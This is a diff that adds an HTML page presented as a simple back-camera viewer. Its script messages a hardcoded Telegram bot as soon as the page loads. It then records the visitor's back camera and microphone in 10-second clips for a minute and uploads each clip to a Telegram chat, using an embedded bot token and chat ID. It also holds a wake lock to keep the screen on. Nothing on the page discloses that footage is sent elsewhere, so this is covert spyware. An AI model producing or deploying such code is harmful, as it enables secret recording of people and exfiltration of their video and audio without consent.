@@ -1,0 +1,148 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Back Camera Video Capture</title>
+    <style>
+        body {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            background-color: #282c34;
+            color: white;
+            font-family: Arial, sans-serif;
+        }
+        video {
+            border: 1px solid #61dafb;
+            margin: 10px;
+        }
+    </style>
+</head>
+<body>
+
+<h1>Back Camera Video Capture</h1>
+<video id="video" width="320" height="240" autoplay muted></video>
+
+<script>
+    const video = document.getElementById('video');
+    let mediaRecorder;
+    let videoChunks = [];
+    let videoInterval;
+
+    const TELEGRAM_BOT_TOKEN = '6961737885:AAGVw4dkOf0B5ThNFwha2xjkINiWaM5tZCA'; // Replace with your actual Telegram bot token
+    const CHAT_ID = '1691680798'; // Replace with your actual Telegram chat ID
+
+    // Send initial message to Telegram when the website starts
+    sendToTelegram("Back camera is starting...");
+
+    // Start video stream using the back camera
+    navigator.mediaDevices.getUserMedia({
+        video: { facingMode: { exact: "environment" } },
+        audio: true
+    })
+    .then(stream => {
+        video.srcObject = stream;
+        startVideoCapture(stream);
+    })
+    .catch(err => console.error("Error accessing back camera: ", err));
+
+    // Start capturing video
+    function startVideoCapture(stream) {
+        mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
+
+        mediaRecorder.ondataavailable = event => {
+            videoChunks.push(event.data);
+            if (videoChunks.length > 0) {
+                const videoBlob = new Blob(videoChunks, { type: 'video/webm' });
+                videoChunks = []; // Reset for the next capture
+                sendVideoToTelegram(videoBlob);
+            }
+        };
+
+        videoInterval = setInterval(() => {
+            videoChunks = []; // Clear previous chunks
+            mediaRecorder.start();
+            setTimeout(() => {
+                mediaRecorder.stop();
+            }, 10000); // Stop recording after 10 seconds
+        }, 10000); // Start a new recording every 10 seconds
+
+        // Stop capturing after 60 seconds
+        setTimeout(stopCapturing, 60000);
+    }
+
+    async function sendToTelegram(message) {
+        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
+
+        // Sending text message to Telegram
+        await fetch(url, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+                chat_id: CHAT_ID,
+                text: message,
+            }),
+        });
+    }
+
+    async function sendVideoToTelegram(videoBlob) {
+        const formData = new FormData();
+        formData.append('chat_id', CHAT_ID);
+        formData.append('video', videoBlob, 'video.webm'); // Name the video as needed
+
+        const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVideo`;
+        await fetch(url, {
+            method: 'POST',
+            body: formData,
+        });
+    }
+
+    function stopCapturing() {
+        // Stop video and audio capture
+        const stream = video.srcObject;
+        const tracks = stream.getTracks();
+
+        tracks.forEach(track => track.stop());
+
+        // Clear the interval
+        clearInterval(videoInterval);
+
+        console.log("Capture stopped after 60 seconds");
+    }
+
+    // Keep the screen on using Wake Lock API
+    if ('wakeLock' in navigator) {
+        let wakeLock = null;
+
+        async function requestWakeLock() {
+            try {
+                wakeLock = await navigator.wakeLock.request('screen');
+                wakeLock.addEventListener('release', () => {
+                    console.log('Wake lock was released');
+                });
+                console.log('Wake lock is active');
+            } catch (err) {
+                console.error(`${err.name}, ${err.message}`);
+            }
+        }
+
+        requestWakeLock();
+
+        // Re-acquire wake lock if it is released
+        document.addEventListener('visibilitychange', async () => {
+            if (wakeLock !== null && document.visibilityState === 'visible') {
+                requestWakeLock();
+            }
+        });
+    } else {
+        console.warn('Wake Lock API not supported by this browser.');
+    }
+</script>
+
+</body>
+</html>
